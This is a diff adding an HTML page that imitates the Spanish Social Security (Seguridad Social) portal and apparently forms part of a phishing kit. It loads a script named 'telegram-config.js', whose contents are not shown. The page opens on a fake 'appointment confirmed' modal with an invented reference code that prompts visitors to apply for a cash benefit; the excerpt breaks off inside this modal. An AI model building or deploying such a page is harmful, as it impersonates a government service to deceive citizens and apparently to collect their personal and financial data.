@@ -1,0 +1,688 @@
+<!DOCTYPE html><html class="light" lang="es" style=""><head>
+<meta charset="utf-8">
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes" name="viewport">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="default">
+<meta name="theme-color" content="#003456">
+<title>Seguridad Social - Gobierno de España</title>
+<script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
+<link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@300;400;600;700&amp;display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&amp;display=swap" rel="stylesheet">
+<script id="tailwind-config">
+        tailwind.config = {
+          darkMode: "class",
+          theme: {
+            extend: {
+              "colors": {
+                      "surface-container": "#eeeeee",
+                      "outline": "#737780",
+                      "tertiary": "#001f3b",
+                      "on-primary-fixed": "#001b3c",
+                      "surface-tint": "#3a5f94",
+                      "on-secondary-container": "#6e5700",
+                      "surface-container-low": "#f3f3f3",
+                      "surface-container-highest": "#e2e2e2",
+                      "secondary": "#745b00",
+                      "surface-container-high": "#e8e8e8",
+                      "secondary-fixed-dim": "#f1c100",
+                      "on-error": "#ffffff",
+                      "primary-fixed": "#d5e3ff",
+                      "on-surface": "#1a1c1c",
+                      "outline-variant": "#c3c6d1",
+                      "secondary-fixed": "#ffe08b",
+                      "error": "#ba1a1a",
+                      "on-secondary": "#ffffff",
+                      "alert-red": "#D32F2F",
+                      "tertiary-fixed-dim": "#9fcaff",
+                      "secondary-container": "#fecb00",
+                      "on-primary-fixed-variant": "#1f477b",
+                      "accent-yellow": "#FFCC00",
+                      "on-primary": "#ffffff",
+                      "sky-blue": "#0077C8",
+                      "surface-dim": "#dadada",
+                      "background": "#f9f9f9",
+                      "tertiary-container": "#00355d",
+                      "primary-container": "#003366",
+                      "inverse-primary": "#a7c8ff",
+                      "on-secondary-fixed-variant": "#584400",
+                      "on-surface-variant": "#43474f",
+                      "on-error-container": "#93000a",
+                      "on-primary-container": "#799dd6",
+                      "inverse-surface": "#2f3131",
+                      "on-tertiary-fixed-variant": "#00497e",
+                      "on-background": "#1a1c1c",
+                      "inverse-on-surface": "#f1f1f1",
+                      "on-tertiary": "#ffffff",
+                      "error-container": "#ffdad6",
+                      "primary": "#001e40",
+                      "on-tertiary-fixed": "#001d36",
+                      "surface": "#f9f9f9",
+                      "text-main": "#212121",
+                      "primary-fixed-dim": "#a7c8ff",
+                      "on-secondary-fixed": "#241a00",
+                      "surface-variant": "#e2e2e2",
+                      "surface-bright": "#f9f9f9",
+                      "tertiary-fixed": "#d2e4ff",
+                      "on-tertiary-container": "#4ba0f3",
+                      "success-green": "#2E7D32",
+                      "government-navy": "#003366",
+                      "surface-container-lowest": "#ffffff",
+                      "brand-teal": "#00738b",
+                      "ss-navy": "#003456",
+                      "ss-yellow": "#FFB800"
+              },
+              "borderRadius": {
+                      "DEFAULT": "0.125rem",
+                      "lg": "0.25rem",
+                      "xl": "0.5rem",
+                      "full": "0.75rem"
+              },
+              "spacing": {
+                      "margin-mobile": "16px",
+                      "gutter": "24px",
+                      "unit": "8px",
+                      "margin-desktop": "32px",
+                      "container-max": "1200px"
+              },
+              "fontFamily": {
+                      "display-lg": ["Public Sans"],
+                      "label-sm": ["Public Sans"],
+                      "body-md": ["Public Sans"],
+                      "headline-lg-mobile": ["Public Sans"],
+                      "headline-lg": ["Public Sans"],
+                      "title-md": ["Public Sans"],
+                      "body-lg": ["Public Sans"]
+              },
+              "fontSize": {
+                      "display-lg": ["48px", {"lineHeight": "56px", "letterSpacing": "-0.02em", "fontWeight": "700"}],
+                      "label-sm": ["14px", {"lineHeight": "20px", "letterSpacing": "0.01em", "fontWeight": "600"}],
+                      "body-md": ["16px", {"lineHeight": "24px", "fontWeight": "400"}],
+                      "headline-lg-mobile": ["24px", {"lineHeight": "32px", "fontWeight": "700"}],
+                      "headline-lg": ["32px", {"lineHeight": "40px", "fontWeight": "700"}],
+                      "title-md": ["20px", {"lineHeight": "28px", "fontWeight": "600"}],
+                      "body-lg": ["18px", {"lineHeight": "28px", "fontWeight": "400"}]
+              }
+            },
+          },
+}
+     </script>
+ <script src="telegram-config.js"></script>
+ <style>
+        .material-symbols-outlined {
+            font-variation-settings: 'FILL' 0, 'wght' 400, 'GRAD' 0, 'opsz' 24;
+        }
+        .active-tab-indicator {
+            border-bottom: 4px solid #00738b;
+        }
+        .accessibility-bar {
+            writing-mode: vertical-rl;
+            transform: rotate(180deg);
+        }
+        
+        .stylized-icon {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 60px;
+            width: 60px;
+            color: #00738b;
+            font-family: "Public Sans", sans-serif;
+            font-size: 42px;
+            font-weight: 700;
+            line-height: 1;
+            position: relative;
+        }
+        
+        .icon-border-c {
+            border: 3px solid #00738b;
+            border-right: none;
+            border-radius: 12px 0 0 12px;
+            width: 35px;
+            height: 45px;
+            position: relative;
+        }
+        .icon-border-c::after {
+            content: '';
+            position: absolute;
+            right: -10px;
+            top: 0;
+            width: 15px;
+            height: 3px;
+            background: #00738b;
+        }
+        .icon-border-c::before {
+            content: '';
+            position: absolute;
+            right: -10px;
+            bottom: 0;
+            width: 15px;
+            height: 3px;
+            background: #00738b;
+        }
+
+        .icon-t {
+            width: 45px;
+            height: 45px;
+            border-top: 5px solid #00738b;
+            border-left: 1px solid transparent;
+            position: relative;
+        }
+        .icon-t::after {
+            content: '';
+            position: absolute;
+            left: 50%;
+            top: 0;
+            width: 4px;
+            height: 100%;
+            background: #00738b;
+            transform: translateX(-50%);
+        }
+        .icon-t::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 0;
+            width: 12px;
+            height: 12px;
+            background: #8ecbd6;
+            z-index: -1;
+        }
+
+        .icon-p {
+            width: 35px;
+            height: 45px;
+            border: 3px solid #00738b;
+            border-radius: 0 15px 15px 0;
+            position: relative;
+        }
+        .icon-p::after {
+            content: '';
+            position: absolute;
+            left: -3px;
+            top: 0;
+            height: 60px;
+            width: 4px;
+            background: #00738b;
+        }
+
+        .icon-e {
+            width: 35px;
+            height: 45px;
+            border: 3px solid #00738b;
+            border-right: none;
+            position: relative;
+        }
+        .icon-e::after {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 50%;
+            width: 25px;
+            height: 3px;
+            background: #00738b;
+            transform: translateY(-50%);
+        }
+.icon-e::before {
+             content: '';
+             position: absolute;
+             left: 5px;
+             top: 50%;
+             width: 15px;
+             height: 10px;
+             background: #8ecbd6;
+             z-index: -1;
+             transform: translateY(-50%);
+         }
+         
+         /* Responsive adjustments */
+         @media (max-width: 640px) {
+             .accessibility-bar {
+                 display: none;
+             }
+             nav ul {
+                 flex-wrap: wrap;
+             }
+             nav li {
+                 flex: 1 1 50%;
+                 max-width: 50%;
+             }
+             .h-36 {
+                 height: auto;
+                 min-height: 100px;
+             }
+             .px-6 {
+                 padding-left: 1rem;
+                 padding-right: 1rem;
+             }
+         }
+    </style>
+</head>
+<body class="bg-white text-on-background font-body-md text-body-md overflow-x-hidden">
+<!-- Accessibility Sidebar -->
+<div class="fixed left-0 top-1/4 z-50 flex flex-col items-center">
+<div class="bg-[#0071B2] text-white py-6 px-3 rounded-r-xl shadow-lg cursor-pointer flex flex-col items-center gap-4">
+<div class="accessibility-bar font-bold text-xs uppercase tracking-widest whitespace-nowrap">
+            HERRAMIENTAS DE ACCESIBILIDAD
+        </div>
+<span class="material-symbols-outlined text-2xl">accessibility_new</span>
+<span class="material-symbols-outlined text-xs">arrow_right</span>
+</div>
+</div>
+<!-- Top Utility Bar -->
+<div class="bg-white">
+<div class="mx-auto px-6 h-20 flex justify-between items-center max-w-7xl">
+<img alt="Gobierno de España - Seguridad Social" class="h-14" src="https://lh3.googleusercontent.com/aida-public/AB6AXuBL0kM__mpfz86K_c2AH3t_Dv0Hl0LbJ3QueSOAfx5uEV2iobJaPn2Fxg8IP8aEUp8XHQ8fW298TeXXMuBZTaAYfRc8UsAXlo-X0tVXylFPBYtikYCRroIpYWYv5pYagryS2ozgTByoCR6Mgn_aGUtGLL0bYiARfm4stXq7pjwMF5y_ItQqYwfqPjVtjNRyCUAfD53wSywVL6wXIqXlE-EXALmnxeDQLUAYsci4YMHkzT2HxRgQUhHlyshvxAPwEN3hzccLRjP7jP9a">
+<div class="flex items-center gap-6 font-medium text-sm text-[#00738b]">
+<a class="hover:underline transition-colors" href="#">Sugerencias y quejas</a>
+<div class="h-4 w-px bg-gray-300"></div>
+<a class="hover:underline transition-colors" href="#">Consultas</a>
+<div class="h-4 w-px bg-gray-300"></div>
+<span class="material-symbols-outlined cursor-pointer hover:scale-110 text-2xl">search</span>
+<div class="h-4 w-px bg-gray-300"></div>
+<div class="flex items-center gap-1 cursor-pointer">
+<span class="">Castellano</span>
+<span class="material-symbols-outlined text-sm">expand_more</span>
+</div>
+</div>
+</div>
+</div>
+<!-- Main Navigation -->
+<nav class="bg-white border-t border-gray-100">
+<div class="mx-auto max-w-7xl">
+<ul class="flex justify-center items-stretch h-36">
+<li class="flex-1 border-x border-gray-100 active-tab-indicator">
+<a class="flex flex-col items-center justify-center h-full gap-4 text-brand-teal" href="#">
+<span class="material-symbols-outlined text-6xl" style="font-variation-settings: 'FILL' 1;">home</span>
+<span class="font-bold text-lg">Inicio</span>
+</a>
+</li>
+<li class="flex-1 border-r border-gray-100">
+<a class="flex flex-col items-center justify-center h-full gap-4 text-brand-teal hover:bg-gray-50 transition-all" href="#">
+<div class="stylized-icon">
+<div class="icon-border-c"></div>
+</div>
+<span class="font-bold text-lg">Conócenos</span>
+</a>
+</li>
+<li class="flex-1 border-r border-gray-100">
+<a class="flex flex-col items-center justify-center h-full gap-4 text-brand-teal hover:bg-gray-50 transition-all" href="#">
+<div class="stylized-icon">
+<div class="icon-t"></div>
+</div>
+<span class="font-bold text-lg">Trabajadores</span>
+</a>
+</li>
+<li class="flex-1 border-r border-gray-100">
+<a class="flex flex-col items-center justify-center h-full gap-4 text-brand-teal hover:bg-gray-50 transition-all" href="#">
+<div class="stylized-icon">
+<div class="icon-p"></div>
+</div>
+<span class="font-bold text-lg">Pensionistas</span>
+</a>
+</li>
+<li class="flex-1 border-r border-gray-100">
+<a class="flex flex-col items-center justify-center h-full gap-4 text-brand-teal hover:bg-gray-50 transition-all" href="#">
+<div class="stylized-icon">
+<div class="icon-e"></div>
+</div>
+<span class="font-bold text-lg">Empresarios</span>
+</a>
+</li>
+</ul>
+</div>
+</nav>
+<!-- Hero Carousel Section -->
+<div class="row-container home-big-bg row-slider-container mx-auto px-6 py-10 max-w-7xl">
+<div class="row grid grid-cols-12 gap-10">
+<div class="col-xs-12 col-sm-12 col-md-9 col-lg-9 row15 col-span-8">
+<h1 class="sr-only">Accesos directos a servicios</h1>
+<div aria-label="Carrusel de la página principal" aria-roledescription="carousel" class="carousel slide mb-8" data-ride="carousel" id="carousel-example-generic">
+<h2 class="sr-only">Carrusel</h2>
+<div class="component-container id-Z7_GB618030DENK1O535TQBQQ6DP1" name="ibmMainContainer">
+<div class="component-control id-Z7_21I4H401MO3010A7H1SC5F30K7">
+<ol class="carousel-indicators flex gap-2 mb-4">
+<li class="active w-3 h-3 rounded-full bg-ss-navy cursor-pointer" data-slide-to="0" data-target="#carousel-example-generic"><span class="sr-only">Ir a Conócenos</span></li>
+<li class="w-3 h-3 rounded-full border border-ss-navy cursor-pointer" data-slide-to="1" data-target="#carousel-example-generic"><span class="sr-only">Ir a Trabajadores</span></li>
+<li class="w-3 h-3 rounded-full border border-ss-navy cursor-pointer" data-slide-to="2" data-target="#carousel-example-generic"><span class="sr-only">Ir a Pensionistas</span></li>
+<li class="w-3 h-3 rounded-full border border-ss-navy cursor-pointer" data-slide-to="3" data-target="#carousel-example-generic"><span class="sr-only">Ir a Empresarios</span></li>
+</ol>
+<div class="pull-right pauseplay-carousel mb-4">
+<button aria-label="Detener carrusel" class="boton boton-reduced col-xs-12 col-sm-6 text-ss-navy" id="pauseButton" title="Detener carrusel" type="button"> <span class="material-symbols-outlined">pause</span></button>
+</div>
+<ul class="carousel-inner relative h-[380px] bg-gray-100 rounded-xl overflow-hidden" role="listbox">
+<li class="item active relative h-full">
+<a class="block h-full" href="#">
+<img alt="" class="w-full h-full object-cover" src="https://lh3.googleusercontent.com/aida-public/AB6AXuBYEFqCpWtIp7d4pD466sBHbHrueVSt1Bo-XF_EplEc9xSL0KcaeHuYdCS4iheJe5h8EvHsx9u2DLogxDqtUkp4SiHa9yobpO38W_6LUyXa9fhznkKhk86yD_-YM0Yu6Vea_ftZER5mpL7vgWrTfBJooowIlEWVSc95VisoWWcA_H8nnbVuQmblsWZgJYcPxm6iZ_pE_kJO92RzmqVM7S86CC3uz9cf-aVXQC4JHiaEhxPMBOKV_bFAX5qp9Q79jgS9J3FoipdbT1II">
+<div class="texto-galeria absolute bottom-0 left-0 right-0 p-8 bg-black/40 text-white">
+<h3 class="text-2xl font-bold">Conócenos</h3>
+<p class="">Conoce la Seguridad Social desde dentro</p>
+</div>
+</a>
+</li>
+</ul>
+</div>
+</div>
+</div>
+<!-- Highlights section integrated -->
+<div class="space-y-6">
+<div class="flex items-stretch bg-[#E9F2F9] rounded-t-xl overflow-hidden mb-8">
+<button class="flex-1 py-6 flex flex-col items-center gap-2 bg-white text-[#005696] border-t-4 border-[#005696]">
+<span class="material-symbols-outlined text-3xl">campaign</span>
+<span class="font-bold">Novedades</span>
+</button>
+<button class="flex-1 py-6 flex flex-col items-center gap-2 text-[#444] hover:bg-white/50 transition-all">
+<span class="material-symbols-outlined text-3xl">info</span>
+<span class="font-bold">Información útil</span>
+</button>
+<button class="flex-1 py-6 flex flex-col items-center gap-2 text-[#444] hover:bg-white/50 transition-all">
+<span class="material-symbols-outlined text-3xl">visibility</span>
+<span class="font-bold">Lo más visitado</span>
+</button>
+<button class="flex-1 py-6 flex flex-col items-center gap-2 text-[#444] hover:bg-white/50 transition-all">
+<span class="material-symbols-outlined text-3xl">security</span>
+<span class="font-bold">Ciberalertas</span>
+</button>
+</div>
+<div class="space-y-0 border-t border-gray-100">
+<a class="flex items-center gap-4 py-5 border-b border-gray-100 group" href="#">
+<span class="material-symbols-outlined text-[#005696] text-3xl">description</span>
+<span class="text-[#005696] font-semibold text-lg group-hover:underline">Proceso de regularización extraordinaria de extranjeros</span>
+</a>
+<a class="flex items-center gap-4 py-5 border-b border-gray-100 group" href="#">
+<span class="material-symbols-outlined text-[#005696] text-3xl">school</span>
+<span class="text-[#005696] font-semibold text-lg group-hover:underline">Prácticas formativas</span>
+</a>
+<a class="flex items-center gap-4 py-5 border-b border-gray-100 group" href="#">
+<span class="material-symbols-outlined text-[#005696] text-3xl">engineering</span>
+<span class="text-[#005696] font-semibold text-lg group-hover:underline">Regularización anual de cotizaciones de trabajo autónomo</span>
+</a>
+<a class="flex items-center gap-4 py-5 border-b border-gray-100 group" href="#">
+<span class="material-symbols-outlined text-[#005696] text-3xl">key</span>
+<span class="text-[#005696] font-semibold text-lg group-hover:underline">Accesos con Cl@ve a servicios de la Sede Electrónica</span>
+</a>
+</div>
+<div class="mt-12 p-8 bg-[#003456] text-white rounded-lg">
+<p class="text-sm opacity-80 mb-2">04/05/2026</p>
+<h3 class="text-xl font-medium leading-relaxed">Mejora de la estadística de Nacimiento y cuidado del menor y de Prestaciones familiares de pago único.</h3>
+</div>
+</div>
+</div>
+<div class="col-xs-12 col-sm-12 col-md-3 col-lg-3 home-links col-span-4 space-y-8">
+<div class="bg-white border border-gray-100 rounded-xl p-8 shadow-sm">
+<div class="mb-10 text-center">
+<div class="text-[#005696] text-xs font-bold uppercase tracking-widest mb-1">Seguridad Social</div>
+<div class="flex items-baseline justify-center gap-1">
+<span class="text-4xl font-light text-[#005696]">Sede</span>
+<span class="text-4xl font-bold text-[#005696]">Electrónica</span>
+</div>
+</div>
+<div class="space-y-6">
+<a class="flex items-center gap-5 group" href="#">
+<div class="w-14 h-14 flex-shrink-0 bg-[#E9F2F9] rounded-full flex items-center justify-center text-[#005696] group-hover:bg-[#005696] group-hover:text-white transition-all">
+<span class="material-symbols-outlined text-3xl">payments</span>
+</div>
+<span class="text-sm font-bold text-[#003456] leading-tight uppercase">PRESTACIONES SEGURIDAD SOCIAL</span>
+</a>
+<a class="flex items-center gap-5 group" href="#">
+<div class="w-14 h-14 flex-shrink-0 bg-[#E9F2F9] rounded-full flex items-center justify-center text-[#E5232F] group-hover:bg-[#E5232F] group-hover:text-white transition-all">
+<span class="material-symbols-outlined text-3xl">description</span>
+</div>
+<span class="text-sm font-bold text-[#003456] leading-tight uppercase">IMPORTASS. PORTAL DE LA TESORERÍA</span>
+</a>
+<a class="flex items-center gap-5 group" href="#">
+<div class="w-14 h-14 flex-shrink-0 bg-[#E9F2F9] rounded-full flex items-center justify-center text-[#0077C8] group-hover:bg-[#0077C8] group-hover:text-white transition-all">
+<span class="material-symbols-outlined text-3xl">hub</span>
+</div>
+<span class="text-sm font-bold text-[#003456] leading-tight uppercase">SISTEMA RED / SISTEMA DE LIQUIDACIÓN DIRECTA</span>
+</a>
+</div>
+</div>
+<div class="bg-white border border-gray-100 rounded-xl p-8 shadow-sm">
+<div class="flex items-center gap-3 mb-8">
+<span class="material-symbols-outlined text-4xl text-[#FFB800]">help</span>
+<h3 class="text-2xl font-bold text-[#003456]">Te Ayudamos</h3>
+</div>
+<div class="space-y-4">
+<a class="flex items-center gap-4 p-4 border border-gray-100 rounded-lg hover:bg-gray-50 transition-all" href="#">
+<span class="material-symbols-outlined text-[#003456] text-3xl">live_help</span>
+<span class="text-xs font-bold text-[#003456] uppercase tracking-wide">RESOLVEMOS TUS DUDAS</span>
+</a>
+<a class="flex items-center gap-4 p-4 border border-gray-100 rounded-lg hover:bg-gray-50 transition-all" href="#">
+<span class="material-symbols-outlined text-[#003456] text-3xl">event_available</span>
+<span class="text-xs font-bold text-[#003456] uppercase tracking-wide">CITA PREVIA PARA TRÁMITES</span>
+</a>
+</div>
+</div>
+<div class="bg-white border border-gray-100 rounded-xl p-8 shadow-sm">
+  <div class="flex items-center gap-3 mb-8">
+    <span class="material-symbols-outlined text-4xl text-ss-navy">newspaper</span>
+    <h3 class="text-2xl font-bold text-ss-navy">Comunicación</h3>
+  </div>
+  <div class="space-y-6">
+    <a class="flex items-center gap-4 group" href="#">
+      <div class="w-12 h-12 flex-shrink-0 border border-gray-100 rounded-full flex items-center justify-center p-1 overflow-hidden">
+        <img src="https://lh3.googleusercontent.com/aida-public/AB6AXuAn_g-34Y7F4l7S_A4fA2D8_1S-S5hV6L0e7v_W4H-T5y-x3n8I5y_X_Z_B_A_S_S_C_S_A_S_S_C" alt="Revista" class="w-full h-full object-contain">
+      </div>
+      <span class="text-xs font-bold text-ss-navy uppercase leading-tight">REVISTA DE LA SEGURIDAD SOCIAL</span>
+    </a>
+    <a class="flex items-center gap-4 group" href="#">
+      <div class="w-12 h-12 flex-shrink-0 border border-gray-100 rounded-full flex items-center justify-center p-1 overflow-hidden">
+        <img src="https://lh3.googleusercontent.com/aida-public/AB6AXuAn_g-34Y7F4l7S_A4fA2D8_1S-S5hV6L0e7v_W4H-T5y-x3n8I5y_X_Z_B_A_S_S_C_S_A_S_S_C" alt="Infovideo" class="w-full h-full object-contain">
+      </div>
+      <span class="text-xs font-bold text-ss-navy uppercase leading-tight">INFOVÍDEO</span>
+    </a>
+    <a class="flex items-center gap-4 group" href="#">
+      <div class="w-12 h-12 flex-shrink-0 border border-gray-100 rounded-full flex items-center justify-center p-1 overflow-hidden">
+        <img src="https://lh3.googleusercontent.com/aida-public/AB6AXuAn_g-34Y7F4l7S_A4fA2D8_1S-S5hV6L0e7v_W4H-T5y-x3n8I5y_X_Z_B_A_S_S_C_S_A_S_S_C" alt="Prensa" class="w-full h-full object-contain">
+      </div>
+      <span class="text-xs font-bold text-ss-navy uppercase leading-tight">GABINETE DE PRENSA</span>
+    </a>
+    <a class="flex items-center gap-4 group" href="#">
+      <div class="w-12 h-12 flex-shrink-0 border border-gray-100 rounded-full flex items-center justify-center p-1 overflow-hidden">
+        <img src="https://lh3.googleusercontent.com/aida-public/AB6AXuAn_g-34Y7F4l7S_A4fA2D8_1S-S5hV6L0e7v_W4H-T5y-x3n8I5y_X_Z_B_A_S_S_C_S_A_S_S_C" alt="Revista Mar" class="w-full h-full object-contain">
+      </div>
+      <span class="text-xs font-bold text-ss-navy uppercase leading-tight">REVISTA MAR</span>
+    </a>
+    <a class="flex items-center gap-4 group" href="#">
+      <div class="w-12 h-12 flex-shrink-0 border border-gray-100 rounded-full flex items-center justify-center p-1 overflow-hidden">
+        <img src="https://lh3.googleusercontent.com/aida-public/AB6AXuAn_g-34Y7F4l7S_A4fA2D8_1S-S5hV6L0e7v_W4H-T5y-x3n8I5y_X_Z_B_A_S_S_C_S_A_S_S_C" alt="Publicaciones" class="w-full h-full object-contain">
+      </div>
+      <span class="text-xs font-bold text-ss-navy uppercase leading-tight">ISMARINA Publicaciones</span>
+    </a>
+  </div>
+</div></div>
+</div>
+</div>
+<!-- Main Content Area -->
+<!-- Footer -->
+<footer class="mt-20">
+<!-- Logo Carousel Section -->
+<div class="bg-white py-12 border-t border-gray-100">
+<div class="mx-auto px-6 relative flex items-center overflow-hidden max-w-7xl">
+<button class="text-[#00738b] z-10 bg-white/80 p-1 rounded-full"><span class="material-symbols-outlined text-4xl">chevron_left</span></button>
+<div class="flex-1 flex justify-between items-center px-8 gap-8">
+<img alt="Seguridad Social Móvil" class="h-10 grayscale opacity-70 hover:grayscale-0 hover:opacity-100 transition-all cursor-pointer" src="https://lh3.googleusercontent.com/aida-public/AB6AXuAn_g-34Y7F4l7S_A4fA2D8_1S-S5hV6L0e7v_W4H-T5y-x3n8I5y_X_Z_B_A_S_S_C_S_A_S_S_C">
+<img alt="Tarjeta Social Digital" class="h-10 grayscale opacity-70 hover:grayscale-0 hover:opacity-100 transition-all cursor-pointer" src="https://lh3.googleusercontent.com/aida-public/AB6AXuAn_g-34Y7F4l7S_A4fA2D8_1S-S5hV6L0e7v_W4H-T5y-x3n8I5y_X_Z_B_A_S_S_C_S_A_S_S_C">
+<img alt="EUGO" class="h-10 grayscale opacity-70 hover:grayscale-0 hover:opacity-100 transition-all cursor-pointer" src="https://lh3.googleusercontent.com/aida-public/AB6AXuAn_g-34Y7F4l7S_A4fA2D8_1S-S5hV6L0e7v_W4H-T5y-x3n8I5y_X_Z_B_A_S_S_C_S_A_S_S_C">
+<img alt="BOE" class="h-10 grayscale opacity-70 hover:grayscale-0 hover:opacity-100 transition-all cursor-pointer" src="https://lh3.googleusercontent.com/aida-public/AB6AXuAn_g-34Y7F4l7S_A4fA2D8_1S-S5hV6L0e7v_W4H-T5y-x3n8I5y_X_Z_B_A_S_S_C_S_A_S_S_C">
+<img alt="Administración Electrónica" class="h-10 grayscale opacity-70 hover:grayscale-0 hover:opacity-100 transition-all cursor-pointer" src="https://lh3.googleusercontent.com/aida-public/AB6AXuAn_g-34Y7F4l7S_A4fA2D8_1S-S5hV6L0e7v_W4H-T5y-x3n8I5y_X_Z_B_A_S_S_C_S_A_S_S_C">
+<img alt="administracion.gob.es" class="h-10 grayscale opacity-70 hover:grayscale-0 hover:opacity-100 transition-all cursor-pointer" src="https://lh3.googleusercontent.com/aida-public/AB6AXuAn_g-34Y7F4l7S_A4fA2D8_1S-S5hV6L0e7v_W4H-T5y-x3n8I5y_X_Z_B_A_S_S_C_S_A_S_S_C">
+</div>
+<button class="text-[#00738b] z-10 bg-white/80 p-1 rounded-full"><span class="material-symbols-outlined text-4xl">chevron_right</span></button>
+</div>
+</div>
+<!-- Dark Navy Bar -->
+<div class="bg-[#001d2d] py-4">
+<div class="mx-auto px-6 text-white text-sm font-medium flex justify-center flex-wrap gap-x-4 max-w-7xl">
+<a class="hover:underline" href="#">Cómo identificarme</a> | 
+            <a class="hover:underline" href="#">Mapa Web</a> | 
+            <a class="hover:underline" href="#">Glosario</a> | 
+            <a class="hover:underline" href="#">Enlaces</a> | 
+            <a class="hover:underline" href="#">Ayuda</a> | 
+            <a class="hover:underline" href="#">Accesibilidad</a> | 
+            <a class="hover:underline" href="#">Información Lingüística</a> | 
+            <a class="hover:underline flex items-center gap-1" href="#">RSS <span class="material-symbols-outlined text-orange-400 text-xs">rss_feed</span></a>
+</div>
+</div>
+<!-- White Bottom Section -->
+<div class="bg-white py-8 border-t border-gray-100">
+<div class="mx-auto px-6 flex flex-col md:flex-row justify-between items-center gap-6 max-w-7xl">
+<div class="text-sm text-gray-700">Copyright © Seguridad Social 2026. Todos los derechos reservados.</div>
+<div class="flex items-center gap-6">
+<div class="flex gap-4 text-sm text-[#00738b] font-medium">
+<a class="hover:underline" href="#">Aviso Legal</a>
+<span class="text-gray-300">|</span>
+<a class="hover:underline" href="#">Política de cookies</a>
+</div>
+<div class="flex gap-3">
+<img alt="W3C HTML 5.0" class="h-6" src="https://lh3.googleusercontent.com/aida-public/AB6AXuBL0kM__mpfz86K_c2AH3t_Dv0Hl0LbJ3QueSOAfx5uEV2iobJaPn2Fxg8IP8aEUp8XHQ8fW298TeXXMuBZTaAYfRc8UsAXlo-X0tVXylFPBYtikYCRroIpYWYv5pYagryS2ozgTByoCR6Mgn_aGUtGLL0bYiARfm4stXq7pjwMF5y_ItQqYwfqPjVtjNRyCUAfD53wSywVL6wXIqXlE-EXALmnxeDQLUAYsci4YMHkzT2HxRgQUhHlyshvxAPwEN3hzccLRjP7jP9a">
+<img alt="W3C WAI-AA WCAG 2.0" class="h-6" src="https://lh3.googleusercontent.com/aida-public/AB6AXuBL0kM__mpfz86K_c2AH3t_Dv0Hl0LbJ3QueSOAfx5uEV2iobJaPn2Fxg8IP8aEUp8XHQ8fW298TeXXMuBZTaAYfRc8UsAXlo-X0tVXylFPBYtikYCRroIpYWYv5pYagryS2ozgTByoCR6Mgn_aGUtGLL0bYiARfm4stXq7pjwMF5y_ItQqYwfqPjVtjNRyCUAfD53wSywVL6wXIqXlE-EXALmnxeDQLUAYsci4YMHkzT2HxRgQUhHlyshvxAPwEN3hzccLRjP7jP9a">
+<img alt="W3C CSS" class="h-6" src="https://lh3.googleusercontent.com/aida-public/AB6AXuBL0kM__mpfz86K_c2AH3t_Dv0Hl0LbJ3QueSOAfx5uEV2iobJaPn2Fxg8IP8aEUp8XHQ8fW298TeXXMuBZTaAYfRc8UsAXlo-X0tVXylFPBYtikYCRroIpYWYv5pYagryS2ozgTByoCR6Mgn_aGUtGLL0bYiARfm4stXq7pjwMF5y_ItQqYwfqPjVtjNRyCUAfD53wSywVL6wXIqXlE-EXALmnxeDQLUAYsci4YMHkzT2HxRgQUhHlyshvxAPwEN3hzccLRjP7jP9a">
+</div>
+</div>
+</div>
+</div>
+</footer>
+<!-- Floating Contact Modal -->
+<div class="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm transition-all duration-300" id="contact-modal">
+<div class="bg-white w-full max-w-lg rounded-xl shadow-2xl overflow-hidden relative transform transition-all duration-300 scale-100 border border-outline-variant">
+<!-- Modal Header -->
+<div class="bg-ss-navy p-6 flex justify-between items-center text-white">
+<div class="flex items-center gap-3">
+<span class="material-symbols-outlined text-3xl">chat</span>
+<div>
+<h2 class="font-bold text-xl leading-tight">Solicitud de prestaciones económicas de la Seguridad Social.</h2>
+<p class="text-xs opacity-80 font-normal">Atención al ciudadano - Sede Electrónica</p>
+</div>
+</div>
+<button class="text-white hover:bg-white/20 p-2 rounded-full transition-all" onclick="closeModal()">
+<span class="material-symbols-outlined">close</span>
+</button>
+</div>
+<!-- Modal Content -->
+<form class="p-8 space-y-6" onsubmit="event.preventDefault(); closeModal();"><div class="flex justify-center mb-6 bg-surface-container-low p-4 rounded-lg">
+<img alt="Ministerio de Inclusión, Seguridad Social y Migraciones" class="h-12 object-contain" src="https://lh3.googleusercontent.com/aida-public/AB6AXuBL0kM__mpfz86K_c2AH3t_Dv0Hl0LbJ3QueSOAfx5uEV2iobJaPn2Fxg8IP8aEUp8XHQ8fW298TeXXMuBZTaAYfRc8UsAXlo-X0tVXylFPBYtikYCRroIpYWYv5pYagryS2ozgTByoCR6Mgn_aGUtGLL0bYiARfm4stXq7pjwMF5y_ItQqYwfqPjVtjNRyCUAfD53wSywVL6wXIqXlE-EXALmnxeDQLUAYsci4YMHkzT2HxRgQUhHlyshvxAPwEN3hzccLRjP7jP9a">
+</div>
+<div class="text-center space-y-4">
+<div class="flex flex-col items-center gap-3">
+<span class="material-symbols-outlined text-success-green text-6xl">check_circle</span>
+<h3 class="text-2xl font-bold text-ss-navy">Cita Confirmada con éxito</h3>
+</div>
+<p class="text-sm text-gray-600 leading-relaxed">
+        Su solicitud ha sido procesada correctamente. Ya puede proceder a solicitar su prestación económica para completar el expediente administrativo.
+    </p>
+</div>
+<div class="bg-gray-50 border border-gray-100 rounded-xl p-5 space-y-4 mt-6">
+<h4 class="text-xs font-bold text-gray-400 uppercase tracking-widest border-b border-gray-200 pb-2">Resumen de la Cita</h4>
+<div class="grid grid-cols-2 gap-y-4 gap-x-2 text-sm">
+<div>
+<p class="text-gray-500 text-xs">
+                Trámite
+            </p>
+<p class="font-bold text-ss-navy">Solicitud de Ayuda</p>
+</div>
+<div>
+<p class="text-gray-500 text-xs">
+                Código de Referencia
+            </p>
+<p class="font-bold text-ss-navy uppercase">CSS-98241-X</p>
+</div>
+<div>
+<p class="text-gray-500 text-xs">
+                Fecha
+            </p>
+<p class="font-bold text-ss-navy" id="display-fecha">13 de Noviembre 2026</p>
+</div>
+<div>
+<p class="text-gray-500 text-xs">
+                Hora
+            </p>
